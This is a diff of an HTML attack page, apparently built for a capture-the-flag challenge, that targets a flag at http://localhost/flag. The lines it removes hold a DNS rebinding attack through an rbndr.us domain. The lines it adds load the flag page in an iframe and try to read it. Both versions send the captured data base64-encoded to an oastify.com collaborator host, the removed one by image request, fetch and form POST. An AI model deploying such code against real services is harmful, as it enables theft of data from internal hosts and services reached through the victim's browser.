@@ -1,53 +1,36 @@
 <!DOCTYPE html>
 <html>
+    <head>HEHE</head>
 <body>
+<iframe id="target" src="http://localhost/flag" width="100%" height="500"></iframe>
 <script>
-// DNS rebinding attack - the core technique
-let attempts = 0;
-const maxAttempts = 10;
+// Wait for iframe to load, then try to access content
+setTimeout(() => {
+    const iframe = document.getElementById('target');
+    try {
+        // This will fail due to CORS, but might work in some configurations
+        const content = iframe.contentDocument.body.innerText;
+        exfiltrate('iframe_content', content);
+    } catch(e) {
+        exfiltrate('iframe_error', e.toString());
+        
+        // Alternative: Take screenshot of what's visible
+        takeScreenshotAlternative();
+    }
+}, 3000);
 
-function rebindingAttack() {
-    attempts++;
+function takeScreenshotAlternative() {
+    // If we can't read content, at least we know the page loaded
+    exfiltrate('status', 'Iframe loaded successfully - flag might be visible');
     
-    // First, access via domain that resolves to your server
-    fetch('http://7f000001.acd918ee.rbndr.us/flag')
-        .then(r => r.text())
-        .then(flag => {
-            // Success! Send flag to our server
-            exfiltrate('flag', flag);
-        })
-        .catch(err => {
-            // After DNS TTL expires, the same domain will resolve to localhost
-            if (attempts < maxAttempts) {
-                setTimeout(rebindingAttack, 1000);
-            } else {
-                exfiltrate('error', 'Rebinding failed: ' + err.message);
-            }
-        });
+    // Try to trigger any JavaScript on the localhost page
+    const iframe = document.getElementById('target');
+    iframe.src = 'http://localhost/flag?callback=alert';
 }
 
-// Start the attack
-setTimeout(rebindingAttack, 1000);
-
 function exfiltrate(type, data) {
-    // Multiple exfiltration methods
     const encoded = btoa(data);
-    
-    // Method 1: Image request
     new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
-    
-    // Method 2: Fetch with no-cors
-    fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '2=' + encoded, {
-        mode: 'no-cors'
-    });
-    
-    // Method 3: Form submission
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/';
-    form.innerHTML = '<input name="' + type + '" value="' + encoded + '">';
-    document.body.appendChild(form);
-    form.submit();
 }
 </script>
 </body>
